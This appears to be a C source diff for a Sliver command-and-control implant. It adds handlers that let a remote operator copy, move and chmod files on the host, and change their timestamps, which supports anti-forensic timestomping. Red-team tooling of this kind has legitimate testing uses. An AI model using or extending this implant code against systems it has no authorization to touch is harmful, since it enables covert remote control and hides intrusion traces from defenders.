@@ -396,6 +396,77 @@ int sliver_rpc_handle_token_owner(const sliver_envelope_t *req, sliver_buf_t *ou
   return sliver_current_token_owner_encode(out, user);
 }
 
+/* --- Cp / Mv / Chmod / Chtimes ----------------------------------------- */
+static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char src[1024];
+  char dst[1024];
+  int64_t written = 0;
+  char err[256];
+
+  if (sliver_src_dst_decode(req->data, req->data_len, src, sizeof(src), dst, sizeof(dst)) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (src[0] == 0 || dst[0] == 0) {
+    (void)snprintf(err, sizeof(err), "%s", "cp: missing src or dst");
+  } else if (sliver_fs_copy(src, dst, &written) != 0) {
+    (void)snprintf(err, sizeof(err), "cp %s -> %s: failed", src, dst);
+  }
+  LOG_DEBUG("rpc: cp %s -> %s (%lld bytes)", src, dst, (long long)written);
+  return sliver_cp_encode(out, src, dst, written, err);
+}
+
+static int handle_mv_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char src[1024];
+  char dst[1024];
+  char err[256];
+
+  if (sliver_src_dst_decode(req->data, req->data_len, src, sizeof(src), dst, sizeof(dst)) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (src[0] == 0 || dst[0] == 0) {
+    (void)snprintf(err, sizeof(err), "%s", "mv: missing src or dst");
+  } else if (sliver_fs_move(src, dst) != 0) {
+    (void)snprintf(err, sizeof(err), "mv %s -> %s: failed", src, dst);
+  }
+  LOG_DEBUG("rpc: mv %s -> %s", src, dst);
+  return sliver_mv_encode(out, src, dst, err);
+}
+
+static int handle_chmod_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char path[1024];
+  char mode[32];
+  int recursive = 0;
+  char err[256];
+
+  if (sliver_chmod_req_decode(req->data, req->data_len, path, sizeof(path), mode, sizeof(mode),
+                              &recursive) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (sliver_fs_chmod(path, mode, recursive) != 0) {
+    (void)snprintf(err, sizeof(err), "chmod %s %s: failed", path, mode);
+  }
+  return sliver_path_resp_encode(out, path, err);
+}
+
+static int handle_chtimes_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char path[1024];
+  int64_t atime = 0;
+  int64_t mtime = 0;
+  char err[256];
+
+  if (sliver_chtimes_req_decode(req->data, req->data_len, path, sizeof(path), &atime, &mtime) != 0) {
+    return -1;
+  }
+  err[0] = 0;
+  if (sliver_fs_settimes(path, atime, mtime) != 0) {
+    (void)snprintf(err, sizeof(err), "chtimes %s: failed", path);
+  }
+  return sliver_path_resp_encode(out, path, err);
+}
+
 /* --- table ------------------------------------------------------------- */
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
@@ -414,6 +485,10 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
+    {SLIVER_MSG_CP_REQ, SLIVER_MSG_CP, handle_cp_entry},
+    {SLIVER_MSG_MV_REQ, SLIVER_MSG_MV, handle_mv_entry},
+    {SLIVER_MSG_CHMOD_REQ, SLIVER_MSG_CHMOD, handle_chmod_entry},
+    {SLIVER_MSG_CHTIMES_REQ, SLIVER_MSG_CHTIMES, handle_chtimes_entry},
     {SLIVER_MSG_CURRENT_TOKEN_OWNER_REQ, SLIVER_MSG_CURRENT_TOKEN_OWNER,
      sliver_rpc_handle_token_owner},
 };
@@ -469,6 +544,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
